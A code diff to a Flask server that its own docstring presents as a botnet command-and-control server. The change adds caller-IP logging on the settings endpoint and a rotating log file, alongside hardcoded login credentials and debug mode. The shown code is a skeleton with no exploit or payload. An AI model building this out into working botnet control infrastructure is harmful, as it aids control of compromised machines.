@@ -1,5 +1,10 @@
 from flask import Flask
+from flask import request
 from CCServer import CCServer 
+
+import logging
+from logging.handlers import RotatingFileHandler
+from time import time
 
 app = Flask(__name__)
 
@@ -12,7 +17,7 @@ by multiple botnet instances, ideally deployed 'round-the-clock'
 """
 
 # parameters for CC instance
-settingsPath = "./data/settings.json"
+settingsPath = './data/settings.json'
 credentialsD = {
     'auth_usr' : "fsociety",
     'auth_pwd' : "steelmountain"
@@ -26,7 +31,11 @@ debug = True
 # ROUTING SERVER - settings retrieval 
 @app.route('/settings', methods=['GET'])
 def getSettings():
+    # retrieving settings
     settings = CC.retrieveSettings()
+    # logging 
+    app.logger.warning("[{0}] => reached by {1} : configuration update required".format(time(), request.remote_addr))
+
     return settings # as a string
 
 # ROUTING SERVER - update settings 
@@ -40,4 +49,9 @@ def getLog():
     return "hello log"
 
 if __name__ == "__main__": 
+    # adding log handler provided by werkzeug lib
+    handler = RotatingFileHandler('./data/ccserver.log', maxBytes=10000, backupCount=1)
+    handler.setLevel(logging.INFO)
+    app.logger.addHandler(handler)
+    # running server
     app.run()
